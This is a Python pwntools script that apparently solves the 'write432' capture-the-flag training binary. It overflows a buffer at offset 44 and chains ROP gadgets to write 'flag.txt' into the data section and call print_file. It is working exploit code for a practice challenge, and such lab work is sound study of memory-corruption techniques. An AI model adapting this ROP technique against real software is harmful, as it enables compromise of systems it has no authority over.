from pwn import *
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
bin = os.path.join(script_dir, 'write432')

bin_elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
break pwnme
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 44

rop = ROP(bin_elf)
mov_gadget_address = 0x08048543 # could not find it with rop
pop_gadget_address = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
data_section_address = bin_elf.symbols.data_start
flag_str = b"flag"
txt_str = b".txt"

rop.raw([pop_gadget_address, data_section_address, flag_str, mov_gadget_address])
rop.raw([pop_gadget_address, data_section_address+0x4, txt_str, mov_gadget_address])
rop.print_file(data_section_address)

pprint(rop.dump())

payload = flat(
    {
        offset: rop.chain()
    }
)

io.sendlineafter(b'>', payload)

io.interactive()
